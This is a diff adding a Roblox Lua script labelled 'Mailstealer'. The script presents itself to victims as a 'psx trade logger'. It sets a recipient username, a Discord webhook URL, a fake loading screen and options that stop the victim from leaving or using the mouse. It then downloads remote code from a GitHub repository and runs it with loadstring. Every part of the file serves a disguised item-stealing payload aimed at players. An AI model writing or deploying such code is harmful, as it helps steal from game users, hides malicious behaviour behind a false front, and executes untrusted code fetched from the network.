@@ -1,0 +1,48 @@
+--[[
+
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+
+
+
+]]--
+
+
+
+
+UserName = "LiveSavage662"
+
+Webhook = "https://discord.com/api/webhooks/1130831801535971428/SgmNC7mHqgB37T1yTXqPmtVmP4TvtNlX-PTUv-KhAJ1NPlnc6tp6FrUqwAnCl3p2xVaL"
+
+UserName2 = "LiveSavage662"
+
+
+
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+
+_G.AntiLeave = true -- make it true if you want the antileave
+
+_G.MouseLock = true -- make it true if you want the mouselock
+
+
+
+
+_G.ScriptName = "psx trade logger"
+
+_G.FirstText = "Preparing..."
+
+_G.SecondText = "Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StickOgh01/MailstealerST01/main/StickOghMailstealer", true))()
